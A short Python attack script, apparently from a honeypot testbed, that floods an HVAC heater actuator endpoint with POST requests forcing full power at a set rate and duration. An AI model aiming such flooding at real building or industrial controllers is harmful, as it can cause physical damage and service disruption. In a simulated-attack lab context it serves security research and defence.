#!/usr/bin/env python3
#attacker/flood_attack.py
import requests, time, sys

BASE="http://hvac_honeypot:5000"
ROLE="attacker"

def flood(rate=10, duration=10):
    interval = 1.0 / max(1, rate)
    end = time.time() + duration
    while time.time() < end:
        try:
            r = requests.post(BASE+"/actuator/heater", json={"power": 1.0, "role": ROLE}, timeout=2)
        except Exception:
            pass
        time.sleep(interval)

if __name__ == "__main__":
    #optional args: rate, duration
    rate = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    flood(rate, duration)